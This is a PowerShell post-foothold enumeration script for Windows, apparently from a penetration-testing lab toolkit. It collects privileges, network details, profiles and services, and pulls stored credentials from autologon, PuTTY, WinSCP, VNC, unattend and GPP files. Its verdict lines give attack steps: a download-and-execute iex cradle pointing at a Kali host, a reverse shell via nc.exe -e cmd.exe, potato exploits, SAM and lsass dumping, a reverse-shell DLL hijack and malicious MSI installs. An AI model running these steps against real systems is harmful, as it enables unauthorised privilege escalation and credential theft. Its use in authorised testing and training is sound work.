# post.ps1 - rasbora post-foothold Windows enumeration. Read only, prints a verdict per section.
# powershell -ep bypass -File post.ps1   or   iex (New-Object Net.WebClient).DownloadString("http://KALI:7331/post.ps1")
# PS 2.0 compatible on purpose: Get-WmiObject not CIM, no ternaries, no ?? .
param([switch]$Full)
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$bar = "=" * 78
$bar
"  post.ps1  rasbora post-foothold enumeration   " + (Get-Date -Format "yyyy-MM-dd HH:mm")
"  sections: 1 identity  2 network  3 users and profiles  4 autologon  5 credential locations"
"            6 root of C:  7 services  8 scheduled tasks  9 installed software  10 verdicts"
"  >> lines are verdicts: what a finding means and which rasbora alias to pull. They repeat in section 10."
$bar
$script:verdicts = @()
$script:section = ""
$script:n = 0
function Sec($t, $hint) {
    # section banner. $t is the name, $hint one line of why this section matters
    $script:n++
    $script:section = $t
    $bar = "=" * 78
    ""
    ""
    $bar
    ("  " + $script:n + ". " + $t)
    if ($hint) { ("     " + $hint) }
    $bar
}
function S($t) { ""; ("  -- " + $t + " " + ("-" * [Math]::Max(3, 70 - $t.Length))) }   # sub-header
function L($t) { "  $t" }
function V($t) { $script:verdicts += ($script:section + ": " + $t); "  >> $t" }   # verdict: shown in place and again at the end
function Cap($items, $n) {
    # print at most n lines unless -Full; the rest is counted
    if ($Full -or $items.Count -le $n) { return $items }
    $items[0..($n-1)] + ("  ... " + ($items.Count - $n) + " more, run with -Full")
}
function Acl($p) {
    # icacls lines where a low-priv principal can write. (F)(M)(W) or WD/AD/DC/GW/GA. BUILTIN\Users, Everyone, Authenticated Users, the current user, its groups
    if (-not (Test-Path -LiteralPath $p)) { return }
    $me = [regex]::Escape($env:USERNAME)
    cmd /c "icacls `"$p`" 2>nul" | Where-Object {
        ($_ -match "(Everyone|Authenticated Users|BUILTIN\u005cUsers|$me|INTERACTIVE)") -and
        ($_ -match "\((F|M|W)\)|\([^)]*(WD|AD|DC|GW|GA)[^)]*\)")
    } | ForEach-Object { "      writable: " + $_.Trim() }
}

# ---------------------------------------------------------------- identity
Sec "IDENTITY" "who you are, what the token can do, which tool matches it"
L ("user      " + (whoami))
$cs = Get-WmiObject Win32_ComputerSystem
$os = Get-WmiObject Win32_OperatingSystem
L ("host      " + $env:COMPUTERNAME + "   domain-joined: " + $cs.PartOfDomain + "   domain: " + $cs.Domain)
L ("os        " + $os.Caption + "  " + $os.Version + "  " + $os.OSArchitecture)
L ("ps        " + $PSVersionTable.PSVersion.ToString())
$net = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" | Where-Object { $_.PSChildName -match "^v\d" } | ForEach-Object { $_.PSChildName }
L ("dotnet    " + ($net -join " "))
$build = [int]$os.BuildNumber
S "privileges"
L "  every privilege on the token. Disabled only means not switched on yet; the exploits switch it on themselves"
$privs = whoami /priv | Where-Object { $_ -match "^Se\w+Privilege" } | ForEach-Object { ($_ -split "\s+")[0] + "  " + (($_ -split "\s{2,}")[-1]) }
$privs | Where-Object { $_ -notmatch "^(SeChangeNotifyPrivilege|SeIncreaseWorkingSetPrivilege)" } | ForEach-Object { L ("  " + $_) }
if ($privs -match "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege") {
    # the GodPotato build must match the newest .NET runtime present: v4 -> gp4, v3.5 -> gp35, only v2 -> gp2.
    # Gust: four days lost running the 3.5 build on a box with only v4.0.30319
    $gp = "gp2"
    if ($net -match "^v3[.]5") { $gp = "gp35" }
    if ($net -match "^v4") { $gp = "gp4" }
    $arch = "x64"; if ($os.OSArchitecture -notmatch "64") { $arch = "x86: use the 32-bit builds (ps32 jp32 sw32), the x64 ones just fail" }
    L ("  .NET runtimes " + ($net -join " ") + "  ->  " + $gp + "   arch " + $arch)
    if ($build -ge 17763) { V ("SeImpersonate on build " + $build + ": " + $gp + ".exe -cmd `"cmd /c whoami`"  (or sig). PrintSpoofer (ps64) if Spooler runs. JuicyPotato does not work here") }
    elseif ($build -ge 17134) { V "SeImpersonate on build ${build}: PrintSpoofer (ps64), needs Spooler. JuicyPotato died at 1809" }
    else { V "SeImpersonate on build ${build}: JuicyPotato (jp64) with a CLSID from clsid/<build>.list, or PrintSpoofer (ps64)" }
    $sp = Get-Service Spooler
    L ("  Spooler: " + $sp.Status)
}
if ($privs -match "SeBackupPrivilege") { V "SeBackup: copy SAM+SYSTEM (sbpc/sbpu dlls, or reg save) then secretsdump LOCAL. On a DC: diskshadow + ntds.dit" }
if ($privs -match "SeRestorePrivilege") { V "SeRestore: overwrite a service binary or utilman.exe (sra), then trigger it" }
if ($privs -match "SeManageVolumePrivilege") { V "SeManageVolume: run smv.exe (gives Users write on C:\Windows), then copy a reverse-shell dll to C:\Windows\System32\wbem\tzres.dll and run systeminfo. Shell comes back as the service that loads it" }
if ($privs -match "SeLoadDriverPrivilege") { V "SeLoadDriver: Capcom.sys / EoPLoadDriver" }
if ($privs -match "SeDebugPrivilege") { V "SeDebug: dump lsass (pd64 -ma lsass.exe) or inject into a SYSTEM process" }
if ($privs -match "SeTakeOwnershipPrivilege") { V "SeTakeOwnership: takeown on a service binary or utilman.exe" }
S "groups of note"
whoami /groups | Where-Object { $_ -match "Admin|Backup|Remote|Server Operators|Account Operators|Print Operators|DnsAdmins|Hyper-V|Distributed COM" } | ForEach-Object { L ("  " + (($_ -split "\s{2,}")[0])) }
$ue = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if ($ue.LocalAccountTokenFilterPolicy -eq 1) { V "LocalAccountTokenFilterPolicy=1: local admins get full tokens remotely, PtH with a local admin hash works (spray -l)" }
if ($ue.EnableLUA -eq 0) { V "UAC disabled: admin group membership is already a high-integrity shell" }
S "switching user on this box"
L "  a cracked account that cannot log on remotely: runas.exe needs the interactive-logon right, service accounts rarely have it"
L "  rcs.exe USER PASS `"C:\Windows\Temp\nc.exe KALI 443 -e cmd.exe`" --remote-impersonation --logon-type 8"

# ---------------------------------------------------------------- network
Sec "NETWORK" "second interface = pivot. 127.0.0.1 ports = what nmap could not see"
S "addresses"
Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | ForEach-Object {
    L ("  " + ($_.IPAddress -join " ") + "   mask " + ($_.IPSubnet -join " ") + "   gw " + ($_.DefaultIPGateway -join " ") + "   dns " + ($_.DNSServerSearchOrder -join " "))
}
$ifs = @(Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled })
if ($ifs.Count -gt 1) { V "more than one interface: this is a pivot host. ligolo agent (ag.exe) -connect KALI:11601 -ignore-cert, then route the other subnet" }
S "arp neighbours (hosts this box has talked to)"
arp -a | Where-Object { $_ -match "dynamic" } | ForEach-Object { L ("  " + $_.Trim()) }
S "listening (pid -> process). 127.0.0.1-only ports are what nmap could not see"
L "  reach a 127.0.0.1 port from kali through ligolo: ip route add 240.0.0.1/32 dev ligolo ; then 240.0.0.1:PORT (not listener_add)"
$procs = @{}
Get-Process | ForEach-Object { $procs[[string]$_.Id] = $_.ProcessName }
netstat -ano | Where-Object { $_ -match "LISTENING|UDP" } | ForEach-Object {
    $f = $_.Trim() -split "\s+"
    $id_ = $f[-1]
    $name = $procs[$id_]
    L ("  " + $f[0].PadRight(4) + $f[1].PadRight(28) + $id_.PadRight(7) + $name)
}
S "routes (non-default, non-local)"
route print | Where-Object { $_ -match "^\s+\d+\.\d+\.\d+\.\d+" -and $_ -notmatch "^\s+(0\.0\.0\.0|127\.|224\.|255\.)" } | ForEach-Object { L ("  " + $_.Trim()) }

# ---------------------------------------------------------------- users
Sec "USERS AND PROFILES" "accounts on the box and every profile with hidden entries, history, flags"
S "local users"
net user | Where-Object { $_ -notmatch "^(User accounts|The command|-+)" -and $_.Trim() } | ForEach-Object { L ("  " + $_.Trim()) }
S "local administrators"
net localgroup administrators | Where-Object { $_ -notmatch "^(Alias|Comment|Members|The command|-+)" -and $_.Trim() } | ForEach-Object { L ("  " + $_.Trim()) }
S "remote desktop users"
net localgroup "Remote Desktop Users" | Where-Object { $_ -notmatch "^(Alias|Comment|Members|The command|-+)" -and $_.Trim() } | ForEach-Object { L ("  " + $_.Trim()) }
S "profiles"
L "  dir /a per profile, hidden included (AppData does not show in tree /f). Junctions and NTUSER files dropped"
Get-ChildItem C:\Users -Force | Where-Object { $_.PSIsContainer -and $_.Name -notmatch "^(All Users|Default|Default User|Public)$" } | ForEach-Object {
    $u = $_.FullName
    ""
    L ("  " + $u)
    Get-ChildItem $u -Force | Where-Object { $_.Mode -notmatch "l" -and $_.Name -notmatch "^(ntuser|NTUSER)" } | ForEach-Object { L ("      " + $_.Mode + "  " + $_.Name) }
    foreach ($sub in "Desktop", "Documents", "Downloads", "Pictures", ".ssh", "AppData\Roaming", "AppData\Local") {
        $d = Join-Path $u $sub
        if (Test-Path $d) {
            $items = @(Get-ChildItem $d -Force | Where-Object { $_.Mode -notmatch "l" -and $_.Name -notmatch "^(desktop.ini|Microsoft|MicrosoftEdge|Packages|Temp|Programs|Comms|ConnectedDevicesPlatform|D3DSCache|CrashDumps|PeerDistRepub|PlaceholderTileLogoFolder|Publishers|VirtualStore|IconCache.db|Adobe|Camera Roll|Saved Pictures)$" })
            if ($items.Count) {
                L ("      " + $sub + ":")
                $items | ForEach-Object { L ("          " + $_.Mode + "  " + $_.Length + "  " + $_.Name) }
            }
        }
    }
    $hist = Join-Path $u "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $hist) {
        L ("      ConsoleHost_history.txt:")
        Get-Content $hist | Where-Object { $_.Trim() } | ForEach-Object { L ("          | " + $_) }
    }
}
S "flags"
@(Get-ChildItem C:\Users -Recurse -Force -Include local.txt, proof.txt) + @(Get-ChildItem C:\ -Force -Include local.txt, proof.txt) | ForEach-Object { L ("  " + $_.FullName) }

# ---------------------------------------------------------------- autologon
Sec "AUTOLOGON" "Winlogon registry: a cleartext password, or the LSA-secret case"
$wl = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
S "winlogon"
L ("AutoAdminLogon    " + $wl.AutoAdminLogon)
L ("DefaultDomainName " + $wl.DefaultDomainName)
L ("DefaultUserName   " + $wl.DefaultUserName)
L ("DefaultPassword   " + $wl.DefaultPassword)
if ($wl.DefaultUserName) {
    if ($wl.DefaultPassword) {
        V ("cleartext autologon: " + $wl.DefaultUserName + ":" + $wl.DefaultPassword + "  -> spray it everywhere, this user may be disabled here but not elsewhere")
    } else {
        V "DefaultUserName set, DefaultPassword absent: the password is an LSA secret (HKLM\SECURITY\Policy\Secrets\DefaultPassword). Not readable as this user"
        V "need SYSTEM: reg save HKLM\SYSTEM sys.hiv ; reg save HKLM\SECURITY sec.hiv ; then impacket-secretsdump -system sys.hiv -security sec.hiv LOCAL   (or mimikatz lsadump::secrets)"
        V "a disabled DefaultUserName is normal: the password is still there, and reused somewhere"
    }
}

# ---------------------------------------------------------------- credential locations
Sec "CREDENTIAL LOCATIONS" "windows.old, unattend, saved creds, client configs, files worth opening"
S "windows.old, backup hives, unattend"
if (Test-Path C:\windows.old) {
    L "C:\windows.old EXISTS"
    foreach ($h in "Windows\System32\config\SAM", "Windows\System32\config\SYSTEM", "Windows\System32\config\SECURITY") {
        $p = Join-Path C:\windows.old $h
        if (Test-Path $p) { L ("  " + $p + "  " + (Get-Item $p).Length + " bytes") }
    }
    V "old SAM+SYSTEM: copy both to kali, impacket-secretsdump -sam SAM -system SYSTEM LOCAL. Old admin hashes are often still valid (local auth: spray -l / -H)"
    Acl "C:\windows.old\Windows\System32\config\SAM"
}
$sam = @(Get-ChildItem C:\Windows.old, C:\Windows\Repair, C:\Windows\System32\config\RegBack -Force -Include SAM, SYSTEM, SAM.bak, SYSTEM.bak -Recurse)
if ($sam.Count) { $sam | ForEach-Object { L ("backup hive  " + $_.FullName + "  " + $_.Length) } }
foreach ($p in "C:\unattend.xml", "C:\Windows\Panther\Unattend.xml", "C:\Windows\Panther\Unattend\Unattend.xml", "C:\Windows\System32\sysprep\sysprep.xml", "C:\Windows\System32\sysprep\sysprep.inf", "C:\sysprep.inf", "C:\sysprep\sysprep.xml") {
    if (Test-Path $p) { L ("unattend     " + $p); Select-String -Path $p -Pattern "<Password>|<Value>|AdministratorPassword|cpassword" -Context 0, 1 | ForEach-Object { L ("    | " + $_.Line.Trim()) } }
}
S "cmdkey /list (saved credentials, usable with runas /savecred)"
cmdkey /list | Where-Object { $_ -match "Target|User" } | ForEach-Object { L ("  " + $_.Trim()) }
S "registry: PuTTY sessions, WinSCP, VNC, RDP saved servers"
Get-ChildItem "HKCU:\Software\SimonTatham\PuTTY\Sessions" | ForEach-Object { $s = Get-ItemProperty $_.PSPath; L ("  putty   " + $_.PSChildName + "  " + $s.HostName + "  user " + $s.UserName + "  proxy-pw " + $s.ProxyPassword) }
Get-ChildItem "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions" | ForEach-Object { $s = Get-ItemProperty $_.PSPath; L ("  winscp  " + $_.PSChildName + "  " + $s.HostName + "  " + $s.UserName + "  pw " + $s.Password) }
foreach ($k in "HKLM:\SOFTWARE\RealVNC\WinVNC4", "HKLM:\SOFTWARE\RealVNC\vncserver", "HKLM:\SOFTWARE\TightVNC\Server", "HKCU:\Software\ORL\WinVNC3", "HKCU:\Software\TightVNC\Server") {
    $v = Get-ItemProperty $k
    if ($v.Password) { L ("  vnc     " + $k + "  Password " + (($v.Password | ForEach-Object { $_.ToString("x2") }) -join "")) }
}
Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" | ForEach-Object { $s = Get-ItemProperty $_.PSPath; L ("  rdp     " + $_.PSChildName + "  hint " + $s.UsernameHint) }
foreach ($f in "C:\Program Files\UltraVNC\ultravnc.ini", "C:\Program Files (x86)\UltraVNC\ultravnc.ini", "C:\Program Files\TightVNC\tvnserver.ini") { if (Test-Path $f) { L ("  vncini  " + $f); Select-String -Path $f -Pattern "passwd" | ForEach-Object { L ("    | " + $_.Line) } } }
S "web and app config files"
foreach ($f in "C:\inetpub\wwwroot\web.config", "C:\xampp\apache\conf\httpd.conf", "C:\xampp\phpMyAdmin\config.inc.php", "C:\xampp\passwords.txt", "C:\wamp\www", "C:\xampp\htdocs", "C:\inetpub\wwwroot", "C:\Program Files\FileZilla Server\FileZilla Server.xml", "C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml", "C:\ProgramData\McAfee\Agent\DB\ma.db") {
    if (Test-Path $f) { L ("  " + $f) }
}
S "files of interest"
L "  kdbx rdp ppk pem key ovpn config ini bak sql ps1 bat vbs txt under the profiles, inetpub, xampp, ProgramData, Temp"
$noise = "\u005c(AppData\u005cLocal\u005c(Microsoft|Packages|Google|Temp)|Windows\u005c|Program Files|desktop.ini|\.git\u005c|All Users\u005c|Default\u005c|Default User\u005c|ProgramData\u005c(Microsoft|VMware|Microsoft OneDrive|Package Cache)|licenses?\u005c|docs?\u005c|manual\u005c|mibs\u005c|share\u005c|pear\u005c|vendor\u005c|extras\u005c|MicrosoftEdgeBackups|windowsXamppPhp|src\u005c|tests\u005c|phpMyAdmin\u005c(doc|js|libraries|sql))"
$noisename = "^(LICENSE|LICENCE|COPYING|COPYRIGHT|NOTICE|CHANGES|CHANGELOG|ABOUT_|INSTALL|news|snapshot|license|manifest|ThirdPartyNotices)"
$foi = @(Get-ChildItem C:\Users, C:\inetpub, C:\xampp, C:\ProgramData, C:\Temp, C:\tmp -Force -Recurse -Include *.kdbx, *.kdb, *.rdp, *.ppk, *.pem, *.key, *.ovpn, *.config, *.ini, *.bak, *.sql, *.ps1, *.bat, *.vbs, *.txt, id_rsa, id_ed25519, *.git-credentials, .htpasswd |
    Where-Object { $_.FullName -notmatch $noise -and $_.Name -notmatch $noisename -and $_.Length -lt 2000000 } |
    ForEach-Object { "  " + $_.Length.ToString().PadLeft(8) + "  " + $_.FullName })
Cap $foi 60
if ($cs.PartOfDomain) {
    S "SYSVOL (GPP cpassword, scripts)"
    $unc = "\" + "\" + $cs.Domain + "\SYSVOL\" + $cs.Domain + "\Policies"
    Get-ChildItem $unc -Recurse -Include Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Drives.xml, Printers.xml, *.ps1, *.bat, *.vbs | ForEach-Object {
        L ("  " + $_.FullName)
        Select-String -Path $_.FullName -Pattern "cpassword|password" | ForEach-Object { L ("    | " + $_.Line.Trim()) }
    }
    if (Get-ChildItem $unc -Recurse -Include Groups.xml) { V "cpassword in Groups.xml decrypts offline: gpp-decrypt CPASSWORD" }
}

# ---------------------------------------------------------------- root of C:
Sec "ROOT OF C:" "non-default directories: backups, scripts, app folders. Where the privesc note usually is"
S "directories"
$stdroot = "^(Windows|Program Files|Program Files \(x86\)|Users|ProgramData|PerfLogs|Recovery|System Volume Information|\`$Recycle\.Bin|\`$WinREAgent|Documents and Settings|inetpub|Config\.Msi|OneDriveTemp|MSOCache)$"
Get-ChildItem C:\ -Force | Where-Object { $_.PSIsContainer -and $_.Name -notmatch $stdroot } | ForEach-Object {
    $d = $_.FullName
    ""
    L $d
    Acl $d
    $kids = @(Get-ChildItem $d -Force | Select-Object -First 25)
    $kids | ForEach-Object { L ("    " + $_.Mode + "  " + ([string]$_.Length).PadLeft(9) + "  " + $_.Name) }
    foreach ($k in $kids) {
        if (-not $k.PSIsContainer -and $k.Length -lt 2048 -and $k.Extension -match "^\.(txt|bat|cmd|ini|ps1|vbs|md|log|cfg|conf)$") {
            L ("    -- " + $k.Name + " --")
            Get-Content $k.FullName | Select-Object -First 20 | ForEach-Object { L ("    | " + $_) }
        }
    }
    if ((cmd /c "icacls `"$d`" 2>nul") -match "(Everyone|Authenticated Users|BUILTIN\u005cUsers|$([regex]::Escape($env:USERNAME))):(\([A-Z]+\))*\((F|M|W)\)") { V ("writable root directory " + $d + ": if anything in it runs on a schedule or as a service, replace the binary (same name, same path) and wait") }
}
Get-ChildItem C:\ -Force | Where-Object { -not $_.PSIsContainer -and $_.Name -notmatch "^(pagefile|hiberfil|swapfile|DumpStack|bootmgr|BOOTNXT)" } | ForEach-Object { L ("  file in root: " + $_.Name + "  " + $_.Length) }

# ---------------------------------------------------------------- services
Sec "SERVICES" "non-Microsoft only. writable binary or dir = replace it. unquoted path with spaces = drop an exe up the path"
S "services"
$svcs = Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -notmatch "^(`"?C:\u005cWindows\u005c)" -and $_.PathName -notmatch "Program Files( \(x86\))?\u005c(Microsoft|Windows Defender|Windows Media Player|Microsoft Update Health|VMware)|ProgramData\u005cMicrosoft\u005cWindows Defender" }
foreach ($s in $svcs) {
    ""
    L ($s.Name + "   " + $s.State + "   start=" + $s.StartMode + "   runs as " + $s.StartName)
    L ("    " + $s.PathName)
    $exe = $s.PathName
    if ($exe -match "^`"([^`"]+)`"") { $exe = $matches[1] }
    elseif ($exe -match "^(\S+\.exe)") { $exe = $matches[1] }
    else { $exe = ($exe -split " -| /")[0] }
    if ($s.PathName -notmatch "^`"" -and $exe -match " ") {
        $parts = $exe -split " "
        $acc = ""; $drops = @()
        for ($i = 0; $i -lt $parts.Count - 1; $i++) { $acc = ($acc + " " + $parts[$i]).Trim(); $drops += ($acc + ".exe") }
        V ("unquoted path with spaces: " + $s.Name + ". Drop points, need write on that dir: " + ($drops -join "  "))
        foreach ($dp in $drops) { Acl (Split-Path $dp -Parent) }
    }
    Acl $exe
    Acl (Split-Path $exe -Parent)
    $sd = cmd /c "sc sdshow $($s.Name) 2>nul" | Where-Object { $_.Trim() }
    if ($sd -match "\(A;;[^;]*(DC|GA|GW|WD|WO)[^;]*;;;(AU|BU|IU|WD|AN)\)") { V ("service DACL gives users CHANGE CONFIG on " + $s.Name + ": sc config " + $s.Name + " binPath= ... then restart   " + $sd) }

}
S "AlwaysInstallElevated"
$aie1 = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
$aie2 = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
L ("AlwaysInstallElevated  HKLM=" + $aie1 + "  HKCU=" + $aie2)
if ($aie1 -eq 1 -and $aie2 -eq 1) { V "both set: msiexec /quiet /qn /i evil.msi runs as SYSTEM (msfvenom -f msi is your one allowed msf use, or build it another way)" }

# ---------------------------------------------------------------- scheduled tasks
Sec "SCHEDULED TASKS" "non-Microsoft tasks with the ACL of what they run, and the startup folders"
S "tasks"
$tasks = schtasks /query /fo LIST /v | Out-String
$blocks = $tasks -split "`r?`n`r?`n"
foreach ($b in $blocks) {
    if ($b -match "TaskName:\s+(\S+)" ) { $tn = $matches[1] } else { continue }
    if ($tn -match "^\u005cMicrosoft") { continue }
    $run = ""; $as = ""; $st = ""; $next = ""
    if ($b -match "Task To Run:\s+(.+)") { $run = $matches[1].Trim() }
    if ($b -match "Run As User:\s+(.+)") { $as = $matches[1].Trim() }
    if ($b -match "Status:\s+(.+)") { $st = $matches[1].Trim() }
    if ($b -match "Next Run Time:\s+(.+)") { $next = $matches[1].Trim() }
    if (-not $run -or $run -match "^COM handler|^N/A") { continue }
    ""
    L ($tn + "   as " + $as + "   " + $st + "   next " + $next)
    L ("    " + $run)
    $exe = $run
    if ($exe -match "^`"([^`"]+)`"") { $exe = $matches[1] } else { $exe = ($exe -split " ")[0] }
    Acl $exe
    if ($exe -match "\.(ps1|bat|vbs|cmd)$" -and (Test-Path $exe)) { Get-Content $exe | Select-Object -First 15 | ForEach-Object { L ("      | " + $_) } }
}
S "startup folders"
foreach ($d in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp", (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup")) { Get-ChildItem $d -Force | Where-Object { $_.Name -ne "desktop.ini" } | ForEach-Object { L ("  " + $_.FullName) }; Acl $d }

# ---------------------------------------------------------------- software
Sec "INSTALLED SOFTWARE" "searchsploit these. Program Files dirs with their ACL"
S "uninstall keys"
$apps = @()
foreach ($k in "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*") {
    Get-ItemProperty $k | Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "^(Microsoft|Windows|Update for|Security Update|Hotfix|KB\d)" } | ForEach-Object { $apps += ($_.DisplayName + "  " + $_.DisplayVersion) }
}
$apps | Sort-Object -Unique | ForEach-Object { L $_ }
S "Program Files"
Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" -Force | Where-Object { $_.PSIsContainer } | Where-Object { $_.Name -notmatch "^(Common Files|Internet Explorer|Windows|Microsoft|MSBuild|Reference Assemblies|VMware|WindowsPowerShell|dotnet|Uninstall Information|Google|Mozilla)" } | ForEach-Object { L ("  " + $_.FullName); Acl $_.FullName }
S "hotfixes (last 10, for wes.py / watson use systeminfo > sysinfo.txt)"
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 | ForEach-Object { L ("  " + $_.HotFixID + "  " + $_.InstalledOn) }

Sec "VERDICTS" "every >> line above, in order. Start here when reading post.txt"
if ($script:verdicts.Count -eq 0) { L "(none fired: nothing automatic. Read ROOT OF C:, the profiles, and the sockets by hand)" }
$i = 0
$script:verdicts | ForEach-Object { $i++; L ("" + $i + ". " + $_) }
Sec "DONE" "take post.txt home: it is the enumeration evidence for the report. -Full for the uncapped lists"
